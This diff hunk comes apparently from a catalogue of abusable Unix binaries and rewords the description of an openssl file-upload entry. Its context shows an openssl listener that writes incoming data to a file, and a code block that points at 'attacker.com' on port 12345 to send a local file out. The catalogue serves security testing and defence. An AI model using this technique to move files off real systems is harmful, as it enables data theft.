@@ -19,7 +19,7 @@ functions:
             openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
             openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 > file_to_save
 
-        Send a file to a TCP port, transmission will be encrypted.
+        Send a local file via TCP. Transmission will be encrypted.
       code: |
         RHOST=attacker.com
         RPORT=12345
